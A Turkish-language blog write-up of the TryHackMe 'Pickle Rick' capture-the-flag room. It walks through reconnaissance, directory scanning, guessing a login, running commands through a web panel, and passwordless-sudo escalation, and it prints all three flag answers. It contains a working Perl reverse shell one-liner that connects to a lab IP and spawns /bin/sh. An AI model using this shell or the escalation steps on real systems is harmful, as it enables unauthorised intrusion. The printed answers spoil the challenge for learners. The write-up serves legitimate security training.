---
title: "TryHackMe | Pickle Rick Write-Up"
date: 2022-04-10T16:10:00+03:00
draft: false
---
Bu içerik TryHackMe platformundaki PickleRick CTF’inin çözümünü içerir. Çözmek isteyenler için: [https://tryhackme.com/room/picklerick](https://tryhackme.com/room/picklerick)

Bu Rick and Morty temalı challenge, Rick’in kendini turşudan insana geri döndürmesi için yapılacak iksirin 3 malzemesini bir web sunucusunun zaafiyetlerinden yararlanarak elde etmeyi gerektirir.

Daha önceden çözdüğüm başka bir keyifli Rick and Morty temalı CTF daha önereceğim:

[https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/](https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/)

Makineyi başlatıyorum.

Hedef siteye gittiğimizde bizi Rick’in istifralarıyla dolu cümleleri karşılıyor.

![Untitled](/img/TryHackMe%20%2032bed/Untitled.png)

Rick bizden iksirin malzemelerini bulmamız için bilgisayarına girmemiz gerektiğini ama parolasını hatırlamadığını söylüyor.

İlk önce bir ipucu var mı diye sayfa kaynağını görüntülüyorum.

Altta yorum satırları içinde ipucumuz bizi bekliyor.

```
 <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
```

Anasayfadaki resmi yeni sekmede açtığımızda nerede depolandığını görüyoruz.

/assets/ yoluna gittiğimizde bazı dosyaları görüyorum. Belki ilerde bir reverse shell yükleyebiliriz.

F12 ile cookie’lere bakıyorum bir şey bulamıyorum.

nmap ile 22 SSH portunun açık olduğunu görüyorum.

![Untitled](/img/TryHackMe%20%2032bed/Untitled%201.png)

Gobuster ile url’yi tarıyorum.

```jsx
gobuster dir -u [https://10-10-4-52.p.thmlabs.com](https://10-10-4-52.p.thmlabs.com/) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Gobuster ile ne kadar denesem de bir sonuç alamıyorum.

Bunun yerine dirsearch ile tarıyorum ve çıkan sonuçlar:

```jsx
[13:46:18] 200 -    2KB - /assets/                                     
[13:46:39] 200 -    1KB - /index.html                                       
[13:46:42] 200 -  882B  - /login.php                                        
[13:46:53] 200 -   17B  - /robots.txt
```

robots.txt’de Rick anlamsızca `Wubbalubbadubdub` diyor.

login.php’de önüme bir login ekranı çıkıyor.

username’i zaten biliyoruz. Şifre için bir brute-force attack uygulayabiliriz.

Burpsuit’in free kısmında zaman sınırlaması konulduğu için hydra kullanmayı tercih ediyorum.

hydra’yı birkaç wordlist ile deniyorum ama başarısız sonuç alıyorum.

Sonra aklıma anlamsızca dediğim `Wubbalubbadubdub` geliyor.

Deniyorum ve sonuç başarılı.

Şimdilik sadece command panel’i görebiliyorum diğer sayfalara yetkim yok. 

![Untitled](/img/TryHackMe%20%2032bed/Untitled%202.png)

Dizini ls komutuyla listeliyorum ve `Sup3rS3cretPickl3Ingred.txt`'i cat komutuyla yazdırıyorum ama başarısız.

![Untitled](/img/TryHackMe%20%2032bed/Untitled%203.png)

Sonra dizin olarak `Sup3rS3cretPickl3Ingred.txt`'e gitmeyi düşünüyorum ve

```jsx
[http://10.10.4.52/Sup3rS3cretPickl3Ingred.txt](http://10.10.4.52/Sup3rS3cretPickl3Ingred.txt)
```

ilk malzememizi buluyorum: `mr. meeseek hair`

clue.txt’de ipucu var mı diye bakıyorum.

```jsx
Look around the file system for the other ingredient.
```

portal.php’in kaynak html kodunda yorum satırında bir şey buluyorum.

```jsx
Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==
```

Sondaki eşittirleri silip cyberchef’te base64’ten çeviriyorum ve bir kaç kez dönen sonucu yaptıktan sonra ortaya çıkan deşifre:

```jsx
rabbit hole
```

“ls /home” komutunu girince iki tane kullanıcı karşıma çıkıyor:

```jsx
rick
ubuntu
```

“ls /home/rick” komutunu girince ikinci malzemenin burada olduğunu anlıyorum.

“cp /home/rick/* .” komutu ile dosyayı buraya kopyalamaya çalışıyorum ama olmuyor.

cat komutu çalışmıyor bunun yerine less komutunu deniyorum, dosyanın içeriğini görüntülüyorum ve ikinci malzememiz: `1 jerry tear`

Artık reverse shell ile komut satırına geçmenin zamanıdır diye düşünüyorum ve internette bash ile reverse shell oluşturabilecek kod parçası arıyorum.

```jsx
	perl -e 'use Socket;$i="10.8.52.245";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Deniyorum ve işe yarıyor.

![Untitled](/img/TryHackMe%20%2032bed/Untitled%204.png)

find / -perm -u=s -type f 2>/dev/null komutuyla sudo’ya yetkisi olan dosyaları listeliyoruz.

Burdan da bize ekmek çıkmıyor.

sudo komutundan ilerliyorum. sudo -l komutuyla aldığım çıktıyla anlıyorum ki www-data kullanıcısı sudo komutunu şifresiz istediği yerde kullanabilir.

![Untitled](/img/TryHackMe%20%2032bed/Untitled%205.png)

Finallerin /root’da olacağı aklıma geliyor

“sudo ls /root/” ile listeliyorum.

```jsx
3rd.txt
snap
```

“sudo cat /root/3rd.txt”

```jsx
3rd ingredients: fleeb juice
```

ve son malzememiz: `fleeb juice`

Yazdığım içeriği okuduğunuz için teşekkür ederim. İyi çalışmalar.